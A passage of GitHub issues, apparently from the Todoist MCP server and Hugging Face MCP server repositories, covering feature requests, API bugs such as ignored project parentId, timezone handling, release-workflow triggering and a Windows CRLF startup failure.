- ✅ Complete the feature parity with Todoist's native capabilities
- ✅ Reduce friction in automated task management workflows
- ✅ Eliminate the need for manual reminder/label setup after API task creation
- ✅ Enable more sophisticated AI-driven productivity scenarios
- ✅ Support advanced organizational methodologies (GTD, PARA, etc.)
- ✅ Address existing community requests (see related issue #55 for labels)

## Alternative Workaround (Current)
Users currently need to:
1. Create task via API (incomplete)
2. Open Todoist app manually
3. Find the task
4. Add reminders manually
5. Add labels manually

This breaks the automation flow and significantly reduces the value of the AI integration.

## Related Issues
- Issue #55: ""Add support for label management"" - shows community demand for labels support
- This issue extends that request to include labels in the core task creation/update tools

---

**Implementation Priority**: Both features use existing, well-documented Todoist API endpoints, making implementation straightforward and high-impact."

Doist/todoist-ai,3386711291,76,parentId parameter ignored in add-projects and update-projects - fails to create/update project hierarchy,closed,2025-09-05T08:24:09Z,2025-10-27T15:55:40Z,[],flamerged,"# `parentId` parameter ignored in add-projects and update-projects - fails to create/update project hierarchy

## Summary
Both the MCP Todoist server and the underlying Todoist REST API v2 ignore the `parent_id` parameter when creating or updating projects, preventing proper project hierarchy management. The only method that works is manual manipulation through the Todoist web/mobile application interface.

## Background
We're migrating 124 tasks from Things 3 to Todoist and need to recreate the organizational structure. Things 3 uses ""Areas"" (ongoing responsibilities) and ""Projects"" (finite outcomes). Since Todoist only has projects, we created a workaround using a parent ""Areas"" project with sub-projects for each area, while keeping actual projects at the top level.

## What We Tried

### 1. MCP: Creating projects with parentId ❌ FAILED

```javascript
mcp__todoist-ai__add-projects([{
  ""name"": ""Motorrad"", 
  ""viewStyle"": ""list"", 
  ""parentId"": ""6cp5PfjvMvgHxcH6""
}])
```

**Result:** Project created successfully but `parentId` was `null`, not nested under parent project.

### 2. MCP: Updating with parentId only ❌ FAILED SILENTLY

```javascript
mcp__todoist-ai__update-projects([{
  ""id"": ""6cpRX5rp85vcmXR8"",
  ""parentId"": ""6cp5PfjvMvgHxcH6""
}])
```

**Result:** MCP reported ""no changes"" but didn't throw an error for invalid/incomplete request.

### 3. MCP: Updating with name + parentId ❌ FAILED

```javascript
mcp__todoist-ai__update-projects([{
  ""id"": ""6cpRX5rp85vcmXR8"",
  ""name"": ""Motorrad"", 
  ""parentId"": ""6cp5PfjvMvgHxcH6""
}])
```

**Result:** MCP reported success but `parentId` remained `null`.

### 4. Direct Todoist API: parentId only ❌ FAILED WITH ERROR

```bash
curl -X POST ""https://api.todoist.com/rest/v2/projects/6cpRX5rp85vcmXR8"" \
  -H ""Authorization: Bearer TOKEN"" \
  -H ""Content-Type: application/json"" \
  -d '{""parent_id"": ""6cp5PfjvMvgHxcH6""}'
```

**Result:** `400 Bad Request` - ""At least one of name, description, color, is_favorite or view_style fields should be set""

### 5. Direct Todoist API: name + parent_id ❌ FAILED SILENTLY

```bash
curl -X POST ""https://api.todoist.com/rest/v2/projects/6cpRX5rp85vcmXR8"" \
  -H ""Authorization: Bearer TOKEN"" \
  -H ""Content-Type: application/json"" \
  -d '{""name"": ""Motorrad"", ""parent_id"": ""6cp5PfjvMvgHxcH6""}'
```

**Result:** `200 OK` with updated JSON response, but `parent_id` was still `null`:

```json
{
  ""id"": ""2359535247"",
  ""parent_id"": null,
  ""name"": ""Motorrad"",
  ""order"": 6,
  ""color"": ""charcoal""
}
```

### 6. Manual update through Todoist application ✅ WORKED

Manually dragging projects into parent projects through the Todoist web interface successfully creates the hierarchy and it persists correctly.

## Root Cause Analysis

This appears to be a **Todoist REST API v2 limitation**, not just an MCP issue:

1. **MCP Issue**: Should return proper error when only `parentId` is provided (currently fails silently)
2. **API Issue**: The `/projects/{id}` PATCH/POST endpoint appears to ignore `parent_id` parameter entirely
3. **Missing Documentation**: Todoist API docs don't clearly specify how to programmatically create/update project hierarchy

## Expected Behavior

- `add-projects` with `parentId` should create projects nested under the specified parent
- `update-projects` with `parentId` should move projects to be nested under the specified parent  
- API should return error for invalid requests instead of silently ignoring parameters
- API should provide a documented way to programmatically manage project hierarchy

## Actual Behavior

- **MCP Level**: `parentId` parameter is silently ignored, no errors thrown for incomplete requests
- **API Level**: `parent_id` parameter is silently ignored in API responses
- **Application Level**: Manual dragging/dropping works perfectly
- Projects are always created/updated at the top level regardless of `parent_id` value

## Evidence That Hierarchy Should Work

### Existing Working Example

We have one existing sub-project that shows correct parent relationship:

```json
{
  ""id"": ""6cp5PxV6c9rW8jXc"",
  ""name"": ""Shopping"",
  ""parentId"": ""6cp5PfjvMvgHxcH6""
}
```

### Manual Interface Works

- Dragging projects in Todoist web interface successfully creates hierarchy
- Parent-child relationships persist correctly when created manually
- `get-overview` API call correctly shows nested structure for manually created hierarchies

## Impact

This severely limits programmatic task management for:

- Users migrating from hierarchical systems (Things 3, Notion, etc.)
- Automation workflows that need to organize projects
- MCP applications trying to manage complex project structures
- Any programmatic project organization needs

## Suspected Solutions Needed

### For MCP Server

1. Properly handle error responses from Todoist API
2. Return meaningful errors when API calls fail silently
3. Investigate alternative API endpoints for hierarchy management

### For Todoist API

1. Fix `parent_id` parameter handling in project update endpoints
2. Provide clear documentation on programmatic hierarchy management
3. Consider adding dedicated endpoints for project hierarchy operations
4. If hierarchy management is intentionally limited to UI, document this clearly

## Environment

- Claude Code with MCP Todoist server
- Todoist REST API v2
- Todoist account with confirmed project nesting capability (works manually)
- All programmatic methods fail while manual methods succeed

This suggests the issue is at the **Todoist API level** rather than implementation-specific, making it a broader platform limitation that affects all programmatic integrations."

Doist/todoist-ai,3339583402,56,Add productivity analysis tool with supporting data tools,open,2025-08-20T21:24:18Z,2025-08-20T23:22:49Z,[],gnapse,"## Summary
Users have requested sophisticated productivity analysis capabilities to understand their task completion patterns, project performance, and workflow health. While ideally this would be implemented as an MCP prompt, current client ecosystem limitations require a tools-first approach.

## Requested Functionality
Based on user feedback, there's demand for:
- Completion trends and productivity patterns
- Project-level performance analysis  
- Task characteristic insights (priority distribution, complexity)
- Workflow health metrics (overdue rates, completion velocity)
- Time-based productivity patterns

## Proposed Implementation

### Primary Approach: Intelligent Tool (Current MCP Reality)
Given that most MCP clients currently support **tools only** (with limited/inconsistent prompts support), implement:

1. **Main tool**: `analyze-productivity` 
   - Orchestrates data gathering internally
   - Takes time period and focus area arguments
   - Provides comprehensive analysis and actionable recommendations
   - Follows our intelligent consolidation philosophy

2. **Supporting data tools** (modular, reusable):
   - `get-productivity-stats` - fetch completion statistics from Todoist API
   - `activities-list` - gather activity log data (see issue #45)
   - (others as needed for specific data requirements)

### Future Consideration: MCP Prompt (Ideal Design)
**Ideally**, this should be implemented as an MCP prompt (`productivity-analysis`) that orchestrates multiple tools, providing:
- User-controlled workflow via prompt interface
- Clear separation between data gathering (tools) and analysis (prompt)
- Better alignment with MCP design patterns

However, the current MCP client ecosystem reality shows [most of the 60+ clients](https://modelcontextprotocol.io/clients) support tools reliably, while prompts have inconsistent/limited support across clients.

### Benefits of Tools-First Approach
- **Broad compatibility**: Works across all MCP clients  
- **Immediate usability**: No dependency on client prompt support
- **Modular design**: Supporting tools remain reusable
- **Future migration path**: Can add prompt later when ecosystem matures

### Example Usage
```
User: ""Analyze my productivity for the last 30 days""
Tool: analyze-productivity(period=""30d"", focus=""overall"")
```

The tool would:
1. Use `get-productivity-stats` for completion metrics
2. Use `activities-list` (issue #45) for detailed activity patterns  
3. Use existing `find-completed-tasks` for task-level analysis
4. Synthesize data into insights and recommendations

## Technical Considerations
- Main tool handles orchestration to ensure broad client compatibility
- Supporting tools designed for reuse beyond just this analysis
- May require direct REST API calls for productivity statistics endpoint
- Maintain our pattern of rich, actionable responses
- Depends on issue #45 completion for comprehensive activity data

## User Value
Bridges the gap between basic task management and strategic productivity optimization through an intelligent, widely-compatible analysis tool that works across the entire MCP client ecosystem."
Doist/todoist-ai,3339558465,55,Add support for label management,closed,2025-08-20T21:12:34Z,2025-08-20T21:50:13Z,[],gnapse,"## Summary
Our MCP server currently lacks label management capabilities, which are essential for organizing and categorizing tasks in Todoist workflows.

## Missing Functionality
- Creating and managing personal labels
- Updating label properties (name, color, etc.)
- Deleting labels
- Retrieving label information (single, all)
- Managing shared labels in collaborative projects
- Removing and renaming shared labels

## Proposed Implementation
Following our intelligent consolidation approach, we could implement this with two tools:

1. **`manage-labels`** - Unified label management (create/update/delete) including shared label operations
2. **`find-labels`** - Search and retrieve labels with filtering capabilities

This approach consolidates what would be 9 separate tools in a traditional API-endpoint-mapping approach into 2 comprehensive tools that match our workflow-centric design philosophy.

## Notes
The specific tool design and parameter structure may evolve during implementation to optimize for user experience and maintain consistency with our existing tool patterns."
Doist/todoist-ai,3339557891,54,Add support for task and project comments,closed,2025-08-20T21:12:19Z,2025-08-22T18:33:40Z,[],gnapse,"## Summary

Currently, our MCP server lacks support for managing comments on tasks and projects. This is a significant gap compared to the full Todoist API capabilities.

## Missing Functionality
- 
- Adding comments to tasks and projects
- Retrieving comments (single, all, filtered by task/project)
- Updating existing comments
- Deleting comments

## Proposed Implementation

Following our intelligent consolidation approach, we could implement this with two tools:

1. **`manage-comments`** - Handle all comment operations (add/update/delete) with operation type parameter
2. **`find-comments`** - Search and retrieve comments with filters for task/project/date ranges

This maintains our philosophy of consolidating related functionality rather than creating separate tools for each API endpoint.

## Notes

The specific tool design may evolve during implementation to best fit our workflow-centric approach and user experience goals.

Doist/todoist-ai,3335492740,50,Timezone handling issues in date comparisons across multiple tools,open,2025-08-19T19:47:28Z,2025-08-19T19:47:28Z,[],gnapse,"## Problem Description

The codebase currently has timezone handling issues when comparing dates, particularly when using local ISO string splitting methods. This affects multiple tools that perform date comparisons and can lead to incorrect behavior across different timezones.

## Current Issues

1. **Local ISO String Splitting**: The current implementation relies on splitting ISO date strings locally without proper timezone consideration
2. **Cross-timezone Inconsistencies**: Date comparisons may produce different results depending on the user's local timezone
3. **Potential Data Accuracy Issues**: Tasks, events, or other date-sensitive operations may be incorrectly filtered or processed

## Impact

This issue affects multiple tools in the codebase that perform date operations, including:
- Date filtering and comparison logic
- Task scheduling and due date handling
- Any time-sensitive operations that rely on date comparisons

## Potential Solutions

1. **Use a proper date library** (e.g., date-fns, moment.js, or Day.js) that handles timezone conversions correctly
2. **Standardize on UTC comparisons** for all internal date operations
3. **Implement timezone-aware date parsing** that considers the user's timezone context
4. **Add proper date normalization** before performing comparisons

## Expected Behavior

Date comparisons should be consistent and accurate regardless of the user's local timezone, ensuring reliable operation across different geographical locations and timezone settings.

## Additional Context

This is a general architectural issue in the codebase that affects multiple components, not related to any specific recent changes or pull requests."
Doist/todoist-ai,3334642834,48,Improve tool output UX with LLM/human-readable responses,closed,2025-08-19T14:37:51Z,2025-08-20T18:26:31Z,[],gnapse,"## 🧩 Problem

Currently, all Todoist AI tools return only structured JSON content, missing the human-readable text content that would significantly improve LLM comprehension and user experience. The MCP specification supports both structured content and text content for good reason - they serve complementary purposes.

**Current limitations:**
- Language models receive only raw JSON without contextual summaries or guidance
- No actionable next-step suggestions to help LLMs provide better user guidance
- Missing human-readable descriptions that improve LLM understanding of operation outcomes
- Tools don't leverage the full MCP protocol capabilities for dual content formats
- LLMs must infer context from raw data instead of receiving explicit guidance

### Examples of Current Output

**Task creation response:**
```json
{
  ""tasks"": [{""id"": ""123"", ""content"": ""Buy milk"", ""projectId"": ""456"", ...}],
  ""projectMapping"": {...}
}
```

**List response:**
```json  
{
  ""tasks"": [...], 
  ""nextCursor"": ""xyz""
}
```

LLMs receiving this output must interpret the raw data without contextual help, missing opportunities for better user assistance.

## 💡 Proposed Solution

Leverage the MCP specification's support for dual content formats by implementing both text content and structured content in all tool responses:

1. **Add response builder utilities** to format consistent, LLM-friendly summaries
2. **Update MCP output format** to include both text content and structured content as per MCP spec
3. **Migrate all tools** to provide contextual text summaries that include:
   - Clear action descriptions (""Added 3 tasks to Project Alpha"")
   - Formatted previews of affected items  
   - Success/failure breakdowns for batch operations
   - Contextual next step suggestions and workflow guidance
4. **Maintain structured data** for precise machine parsing and validation

## 🌟 Expected Benefits

- **Enhanced LLM comprehension**: Language models receive explicit context and guidance alongside raw data
- **Better user assistance**: LLMs can provide more helpful suggestions using the contextual information
- **MCP specification compliance**: Proper use of both text and structured content as recommended
- **Improved workflow guidance**: Next-step suggestions help LLMs guide users through complex operations
- **Backwards compatibility**: Structured content remains intact for existing integrations
- **Developer experience**: Human-readable summaries aid debugging and development

## ✅ Acceptance Criteria

- [ ] All tools return both text content and structured content per MCP specification
- [ ] Response builders handle tasks, projects, batch operations, and lists consistently  
- [ ] Text content includes contextual next steps and workflow guidance for LLMs
- [ ] Error responses provide clear guidance in both text and structured formats
- [ ] All tests updated to validate new dual-content response format
- [ ] Structured content maintains backward compatibility and precise data validation
- [ ] Implementation follows MCP specification recommendations for tool results

Doist/todoist-ai,3331901214,45,feat: Enable activities-list tool once SDK supports activities endpoint,closed,2025-08-18T19:47:03Z,2025-10-24T08:01:41Z,[],kyzzen,"## Enhancement description

Complete the implementation of the `activities-list` tool in the Todoist MCP server once the TypeScript SDK adds support for the `/api/v1/activities` endpoint. The tool structure and types are already in place as a placeholder - it just needs the execute function to be activated when the SDK dependency is updated.

The current placeholder implementation in `src/tools/activities-list.ts` is ready to be activated with minimal changes:
- Remove the error throw statement
- Uncomment the actual implementation code
- Update the tool description to remove the limitation notice

## The problem it solves

The activities-list tool will unlock powerful automation and analysis capabilities for Todoist users through AI assistants:

1. **Automated Daily Standups**
   - ""What did I complete yesterday?"" - Generate instant standup reports
   - ""Show my team's progress this week"" - Track team productivity
   - ""What's been happening in the Marketing project?"" - Project-specific updates

2. **Smart Task Recovery**
   - ""What was the original due date for this task?"" - Check historical changes
   - ""Who moved this task to a different project?"" - Audit trail for accountability
   - ""Show me what changed before the issue occurred"" - Debug workflow problems

3. **Productivity Insights**
   - ""When am I most productive?"" - Analyze completion patterns by hour/day
   - ""How long do tasks typically stay in my inbox?"" - Identify procrastination patterns
   - ""Which projects are getting the most attention?"" - Resource allocation analysis

4. **Context-Aware Assistance**
   - AI can understand task history to provide better suggestions
   - Detect patterns in how users work with certain types of tasks
   - Learn from past behavior to improve recommendations

5. **Team Collaboration Features**
   - ""Who's been working on what?"" - Team activity summaries
   - ""Show changes made by John this week"" - Individual contribution tracking
   - ""What tasks were reassigned today?"" - Workload monitoring

## Alternatives

### Current Limitations

Without the activities-list tool, users must:

1. **Manually track changes** - No automated way to see what happened
2. **Use only completed tasks list** - Missing updates, additions, deletions, and other changes
3. **Lose historical context** - Cannot see how tasks evolved over time
4. **Miss collaboration insights** - No visibility into team member activities

### Temporary Workarounds

Currently, users can only:
- Use `tasks-list-completed` for partial activity data (completions only)
- Manually check individual tasks for current state (not historical)
- Export data periodically and compare manually

## Use case / screenshots

### Example 1: Daily Standup Generation
```typescript
// User prompt: ""What did I accomplish yesterday?""
const result = await mcp.callTool('activities-list', {
    eventType: 'completed',
    limit: 50
})

// AI generates response:
""Yesterday you completed:
✅ Review pull request #123
✅ Update documentation for API changes  
✅ Fix authentication bug
✅ Attend team standup meeting""
```

### Example 2: Project Audit Trail
```typescript
// User prompt: ""Show me all changes to the Q4 Planning project""
const result = await mcp.callTool('activities-list', {
    objectType: 'project',
    objectId: 'q4_planning_id',
    limit: 100
})

// AI generates response:
""Q4 Planning project history:
- Oct 15, 2:30 PM: Sarah added 'Budget review' task
- Oct 15, 3:15 PM: John moved 'Market analysis' to In Progress
- Oct 16, 9:00 AM: Emma completed 'Stakeholder interviews'
- Oct 16, 11:30 AM: Sarah updated due date for 'Final presentation'""
```

### Example 3: Productivity Analysis
```typescript
// User prompt: ""When am I most productive during the day?""
const result = await mcp.callTool('activities-list', {
    eventType: 'completed',
    limit: 200
})

// AI analyzes and responds:
""Based on your last 200 completed tasks:
🌅 Morning (6-9 AM): 35% of completions
☀️ Late Morning (9-12 PM): 40% of completions  
🍽️ Afternoon (12-3 PM): 15% of completions
🌆 Evening (3-6 PM): 10% of completions

You're most productive between 9 AM and noon!""
```

## Additional information

### Benefits to MCP Users

- **Richer context** for AI assistants to understand user's work patterns
- **Data-driven insights** without manual tracking
- **Historical understanding** of how projects and tasks evolve
- **Team visibility** in shared workspaces
- **Automation opportunities** for reports and summaries

### Dependencies

- Requires: `@doist/todoist-api-typescript` SDK update with activities endpoint support
- Related issue: [[#312](https://github.com/Doist/todoist-api-typescript/issues/312)]
- No breaking changes to existing tools

This enhancement will make the Todoist MCP server significantly more powerful for productivity analysis, team collaboration, and intelligent task management."
Doist/todoist-ai,3328316110,41,Feature Request: Add Labels Support to MCP Server Tools,closed,2025-08-17T13:05:53Z,2025-09-24T13:44:32Z,[],kyzzen,"# Feature Request: Add Labels Support to MCP Server Tools

## Is your feature request related to a problem?
Currently, the Todoist MCP server (`@doist/todoist-ai` v2.0.1) doesn't expose the ability to manage task labels, even though the underlying Todoist API and TypeScript SDK fully support this feature. This prevents users from:
- Adding labels when creating tasks
- Updating labels on existing tasks
- Removing labels from tasks

### Describe the solution you'd like
Add the optional `labels` field (array of strings) to the Zod schemas in:
1. `src/tools/tasks-add-multiple.ts` - for creating tasks with labels
2. `src/tools/tasks-update-one.ts` - for updating task labels

### Implementation
The implementation is straightforward - just add one line to each file:

```typescript
// In both TaskSchema (tasks-add-multiple.ts) and ArgsSchema (tasks-update-one.ts):
labels: z.array(z.string()).optional().describe('Array of label names for the task.')
```

## Example Usage
```typescript
// Create task with labels
await mcp.callTool('tasks-add-multiple', {
  tasks: [{
    content: 'Quarterly review',
    labels: ['work', 'q4-2025', 'important']
  }]
})

// Update task labels
await mcp.callTool('tasks-update-one', {
  id: 'task_id',
  labels: ['urgent', 'today']
})
```

### Why this matters
- **Feature completeness**: Labels are a core Todoist feature for task organization
- **No breaking changes**: The field is optional, maintaining backward compatibility
- **Zero dependencies**: Uses existing API capabilities
- **Minimal code change**: Only 2 lines of code needed

### Additional context
- Tested locally and confirmed working with Todoist API
- The `@doist/todoist-api-typescript` package already includes full labels support
- Labels are passed as label names (strings), not IDs"
Doist/todoist-ai,3327335151,35,Release-Please v4 publish workflow not triggering automatically - requires manual re-tagging,closed,2025-08-16T14:38:10Z,2025-10-26T12:25:30Z,[],gnapse,"## Problem Description

Our npm publishing workflow systematically fails to trigger automatically when Release-Please creates tags, requiring manual re-tagging of the same commit to successfully publish packages to npm.

## Observed Behavior

1. ✅ Release-Please creates proper release commits and tags (e.g., `v2.2.0`)
2. ❌ Publish workflow (`on: push: tags: - ""v*""`) does not trigger automatically
3. ✅ Manual re-tagging of the same commit immediately triggers the workflow and succeeds
4. 🔄 This pattern has been consistent across multiple releases (v2.0.1, v2.1.0, v2.2.0)

## Root Cause Analysis

Based on research and testing, this appears to be caused by multiple GitHub Actions limitations:

### 1. **GitHub Actions Fundamental Limitation**
- Actions in a workflow run can't trigger new workflow runs when using `GITHUB_TOKEN`
- Release-Please uses `GITHUB_TOKEN` to create tags
- The publish workflow listening for `push: tags:` doesn't get triggered
- Manual re-tagging works because it's done by a different actor

### 2. **Webhook Rate Limiting (2024)**
- GitHub introduced new webhook rate limits: 1500 triggered events per repository every 10 seconds
- Release-Please may hit this limit during rapid commit/release/tag creation
- This explains the intermittent failures

### 3. **Timing Race Conditions**
- Release-Please creates commits, releases, and tags in rapid succession
- GitHub's webhook delivery system can't keep up with the sequence
- Manual re-tagging gives webhooks time to process properly

## Evidence

- Search results show this is a known issue affecting many projects using Release-Please v4
- GitHub community discussions confirm workflows cannot reliably trigger other workflows
- The issue has been reported across 2024-2025 timeframe

## Potential Solutions

### **Option 1: Use Personal Access Token (PAT)**
Replace `GITHUB_TOKEN` with a PAT in release-please workflow:

```yaml
- uses: googleapis/release-please-action@v4
  with:
    token: ${{ secrets.RELEASE_PLEASE_TOKEN }}  # PAT instead of GITHUB_TOKEN
```

### **Option 2: Use `workflow_run` Event**
Change publish workflow to trigger on workflow completion:

```yaml
on:
  workflow_run:
    workflows: [""Release Please""]
    types: [completed]
```

### **Option 3: Combine Workflows**
Move npm publishing into the release-please workflow itself using the `releases_created` output.

### **Option 4: Add Workflow Dispatch Trigger**
Add manual trigger capability as fallback:

```yaml
on:
  push:
    tags:
      - ""v*""
  workflow_dispatch:
    inputs:
      tag:
        description: 'Tag to publish'
        required: true
```

## Current Workaround

Until a permanent solution is implemented, the current workaround is:

```bash
# Delete and re-create the tag
git tag -d v<version>
git push origin :v<version>
git tag v<version> <commit-sha>
git push origin v<version>
```

## Next Steps

We should implement one of the proposed solutions to eliminate the need for manual re-tagging on every release."
Doist/todoist-ai,3323794138,27,Add Duration Field Support to Task Update Tool,closed,2025-08-14T22:47:43Z,2025-08-15T16:29:11Z,[],kyzzen,"# Add Duration Field Support to MCP Tool Implementation

## Problem
The Todoist API and TypeScript SDK both support `duration` and `duration_unit` fields for tasks, but the MCP tool implementation doesn't expose these fields to users. This prevents users from setting actual task durations programmatically, limiting them to text-based conventions like ""from 10:00 for 2h"" in the task name.

## Current Behavior
- The MCP tools (`tasks-update-one` and `tasks-add-multiple`) don't include duration parameters
- When updating a task with duration notation (e.g., ""from 10:00 for 2h""), it's stored as plain text in the task content
- The actual Todoist duration feature (Pro/Business) isn't triggered via MCP tools
- Users cannot leverage Todoist's calendar view duration functionality

## Expected Behavior
- The `tasks-update-one` tool should accept `duration` and `durationUnit` parameters
- The `tasks-add-multiple` tool should also support these fields
- Duration should be properly set in Todoist's system using the SDK

## SDK Support Verification ✅
Testing confirms the Todoist TypeScript SDK (`@doist/todoist-api-typescript`) **DOES support** duration fields:

```typescript
// Successfully tested with SDK version 5.1.1
const newTask = await api.addTask({
    content: 'Test task with duration',
    dueString: 'today at 2pm',
    duration: 120,
    durationUnit: 'minute'
})
// Result: task created with duration: { amount: 120, unit: 'minute' }

const updatedTask = await api.updateTask(taskId, {
    duration: 180,
    durationUnit: 'minute'
})
// Result: task updated with duration: { amount: 180, unit: 'minute' }
```

## Type Definitions in SDK
The SDK properly defines duration support:
- `AddTaskArgs` includes: `RequireAllOrNone<{duration?: Duration['amount']; durationUnit?: Duration['unit'];}>`
- `UpdateTaskArgs` includes: `RequireAllOrNone<{duration?: Duration['amount']; durationUnit?: Duration['unit'];}>`
- `Duration` type: `{ amount: number; unit: 'minute' | 'day' }`
- Task entity returns duration as: `duration: { amount: number, unit: 'minute' | 'day' } | null`

## Implementation Required
The MCP tools need to be updated to:
1. Add duration and durationUnit parameters to the Zod schemas
2. Pass these parameters through to the SDK's addTask/updateTask methods
3. Handle the RequireAllOrNone constraint (both fields must be provided together or neither)

## Affected Files
- `src/tools/tasks-update-one.ts` - Add duration fields to schema and implementation
- `src/tools/tasks-add-multiple.ts` - Add duration fields to schema and implementation
- `src/tools/__tests__/tasks-update-one.test.ts` - Add tests for duration
- `src/tools/__tests__/tasks-add-multiple.test.ts` - Add tests for duration

## Use Case
Users following time-blocking methodologies need to:
1. Set estimated durations when planning tasks
2. Update durations based on actual time spent
3. Generate time reports from completed tasks with duration data

### 2. Update tasks-add-multiple.ts
Similar changes to add duration fields to TaskSchema and pass them through to the SDK.

## Additional Context
- This is particularly important for Pro/Business users who have access to Todoist's duration feature
- The feature has a 24-hour maximum duration limit (1440 minutes)
- Requires tasks to have both date and time set for duration to be meaningful
- Duration units are 'minute' or 'day' (not 'hour')
- The SDK enforces that both duration and durationUnit must be provided together"

Doist/todoist-ai,3322445622,20,Unable to move tasks between projects using todoist-ai MCP server,closed,2025-08-14T14:29:07Z,2025-08-14T20:57:10Z,[],kyzzen,"## Description
When trying to move tasks from one project to another using the `tasks-update-one` tool in the todoist-ai MCP server, the operation appears to complete but the task remains in its original project.

## Environment
- Node.js: v22.16.0
- OS: Linux (WSL2)
- Using with: Claude Claude

## Steps to Reproduce
1. Install and configure the todoist-ai MCP server with a valid API key
2. Have at least two projects in Todoist (e.g., ""Capture"" and ""Inbox"")
3. Create a task in the first project
4. Use the `tasks-update-one` tool to move the task to a different project by providing:
   - `id`: The task ID
   - `projectId`: The target project ID
5. Check Todoist to see where the task is located

## Expected Behavior
The task should be moved from the original project to the target project specified in the `projectId` parameter.

## Actual Behavior
The tool returns a 400 error when attempting to move a task. 

## Error Details
- The error occurs immediately when attempting the move operation
- The Todoist API rejects the request as invalid

## Additional Information
- The `tasks-organize-multiple` tool has the same problem when trying to move multiple tasks
- Other update operations (changing content, description, priority, due date) work correctly without errors
- I haven't tested the sectionId or parentId move

## Impact
This prevents users from organizing their tasks programmatically through the MCP server, which is a core feature for task management automation."

Doist/todoist-ai,3315868613,13,Consolidate MCP tools to reduce tool count and improve performance,closed,2025-08-12T20:41:40Z,2025-08-13T13:40:37Z,[],gnapse,"> [!NOTE]
> The consolidations we're making in the end are not exactly the ones outlined before, but still, we managed to get things down to 13 tools. See #14 (to be released soon).

## Problem

Our MCP server currently has **23 tools**, which is approaching the recommended limits for optimal LLM performance. Research shows that:

- Models start showing degraded performance with too many tools
- Cursor warns when tool count exceeds 40
- Smaller models get confused with fewer tools
- The recommendation is to design around use cases rather than mapping every API endpoint to a tool

Additionally, we need to add comment functionality, which will increase the tool count further.

## Analysis Results

### Current Tool Count by Category:
- **Task listing tools**: 6 tools (`tasks-list-by-date`, `tasks-list-overdue`, `tasks-list-for-project`, `tasks-list-for-section`, `tasks-search`, `tasks-list-completed`)
- **Search tools**: 3 tools (`tasks-search`, `projects-search`, `sections-search`)  
- **CRUD operations**: 8 tools (projects: add/update/delete, sections: add/update/delete, tasks: update/delete)
- **Other tools**: 6 tools (bulk operations, overviews, subtasks, etc.)

**Total: 23 tools**

## Proposed Consolidation

### Phase 1: High-Impact Consolidations

#### 1. Merge Task Listing Tools (6 → 1)
**Current separate tools:**
- `tasks-list-by-date` - uses filter query `(due after: X | due: X) & due before: Y`
- `tasks-list-overdue` - uses filter query `overdue` 
- `tasks-list-for-project` - calls `client.getTasks({projectId})`
- `tasks-list-for-section` - calls `client.getTasks({sectionId})`
- `tasks-search` - uses filter query `search: X`
- `tasks-list-completed` - calls specific completed task methods

**Proposed consolidated tool:**
```typescript
{
  name: 'tasks-list',
  parameters: {
    scope: 'project' | 'section' | 'date' | 'overdue' | 'search' | 'completed',
    projectId?: string,
    sectionId?: string, 
    startDate?: string,
    daysCount?: number,
    searchText?: string,
    getBy?: 'completion' | 'due', // for completed tasks
    limit?: number,
    cursor?: string
  }
}
```

**Savings: -5 tools**

#### 2. Merge Search Tools (3 → 1)
**Current separate tools:**
- `tasks-search` - searches tasks by text
- `projects-search` - searches projects by name  
- `sections-search` - searches sections by name

**Proposed consolidated tool:**
```typescript
{
  name: 'search',
  parameters: {
    type: 'tasks' | 'projects' | 'sections',
    searchText: string,
    projectId?: string, // for section search
    limit?: number,
    cursor?: string
  }
}
```

**Savings: -2 tools**

### Phase 2: Optional CRUD Consolidation (8 → 3)
If more tool budget is needed for comments functionality:

**Current pattern:**
- `projects-add-one`, `projects-update-one`, `projects-delete-one`
- `sections-add-one`, `sections-update-one`, `sections-delete-one`  
- `tasks-update-one`, `tasks-delete-one`

**Proposed consolidated tools:**
- `projects-manage` (add/update/delete)
- `sections-manage` (add/update/delete)
- `tasks-manage` (update/delete individual tasks)

**Savings: -5 tools**

## Expected Results

### Phase 1 Only:
- **Current**: 23 tools
- **After consolidation**: 16 tools  
- **Savings**: -7 tools

### Phase 1 + 2:
- **Current**: 23 tools
- **After consolidation**: 11 tools
- **Savings**: -12 tools

## Benefits

1. **More tool budget** available for upcoming comment functionality
2. **Better LLM performance** - fewer tools to choose from reduces confusion
3. **More powerful workflows** - consolidated tools can handle complex scenarios in single calls
4. **Follows MCP best practices** - design around use cases rather than API endpoints
5. **Maintains functionality** - all current capabilities preserved

## Implementation Notes

- Keep existing shared utilities (`getTasksByFilter`, `mapTask`, etc.)
- Use discriminated unions in Zod schemas for clean parameter validation  
- Balance consolidation benefits vs. parameter schema complexity

huggingface/hf-mcp-server,3460981658,94,Windows checkout: container fails to start due to CRLF (^M) in start.sh (Docker on Windows),closed,2025-09-28T02:41:44Z,2025-10-02T03:57:05Z,[],hyeonseo2,"While running the project via Docker on Windows, the container fails to start because start.sh is interpreted with CRLF line endings. 
If helpful, I’d like to propose a minimal fix: adding a .gitattributes entry to enforce LF for *.sh. 

### Environment
 - Windows 11 (WSL)
 - Project: hf-mcp-server (Docker build & run)

### Steps to Reproduce 
1) Clone the repo on Windows with default Git settings (`core.autocrlf=true`)
2) docker build -t hf-mcp-server . 
3) docker run --rm -p 3000:3000 hf-mcp-server 

### Actual 
Container fails to start; start.sh is parsed with CRLF:
```
: not found line 2:
: not found line 11:
./start.sh: line 34: syntax error: unexpected word (expecting ""in"")
```
head -n 3 start.sh | cat -A shows:
```
#!/bin/sh^M
^M
# Default to stdio transport if not specified^M
```

### Expected 
Container starts and start.sh runs normally. 

### Proposed 
Fix Add a .gitattributes entry at the repo root to enforce LF for shell scripts: 
*.sh text eol=lf

### Verification
After adding the above `.gitattributes` entry and rebuilding, the container starts successfully and `start.sh` executes without errors on Windows (WSL)."
huggingface/hf-mcp-server,3449493710,92,Security: Moving official server to HuggingFace GitHub organisation?,closed,2025-09-24T13:37:52Z,2025-10-09T10:31:09Z,[],lukestanley,"@julien-c @evalstate 
May I suggest that this repository be moved to the huggingface GitHub organisation account?

I see that https://huggingface.co/mcp does link here, so people can check that to validate the claim of being official, but it would be much better if checking the authenticity was not needed, and this would reduce account takeover risk too.

MCP is rapidly gaining popularity and security is a concern. To encourage more secure behaviour, I suggest transitioning this official server repository from the third party GitHub account to https://github.com/huggingface/hf-mcp-server

It should be fairly quick and painless, right?

Best wishes, and thanks for all the fish!"

- No READMEs in `packages/app` and `packages/mcp`
- I feel like `package/mcp` could be renamed to `package/tools` (and `packages/app` to `pacakges/mcp`?)

This whole section:

https://github.com/evalstate/hf-mcp-server/blob/a1f377ae94277f376d35fa2ce2db70dab3d6d584/README.md#L24-L41

